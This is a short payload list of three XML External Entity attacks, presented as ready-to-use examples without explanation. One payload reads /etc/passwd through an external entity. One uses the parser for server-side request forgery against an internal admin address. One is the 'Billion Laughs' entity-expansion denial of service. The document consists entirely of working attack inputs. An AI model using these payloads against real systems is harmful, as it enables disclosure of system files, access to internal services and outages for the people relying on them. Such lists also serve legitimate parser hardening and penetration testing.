## Basic example payloads:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY e SYSTEM "file:///etc/passwd">
    ]>
    <root>&e;</root>

## Simple SSRF via SYSTEM:

    <?xml version="1.0"?>
    <!DOCTYPE root [
      <!ENTITY e SYSTEM "http://10.0.0.5/admin">
    ]>
    <root>&e;</root>

## Billion Laughs DoS:

    <?xml version="1.0"?>
    <!DOCTYPE lolz [
      <!ENTITY a "aaaaaaaaaa">
      <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
      <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
      <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
    ]>
    <root>&d;</root>

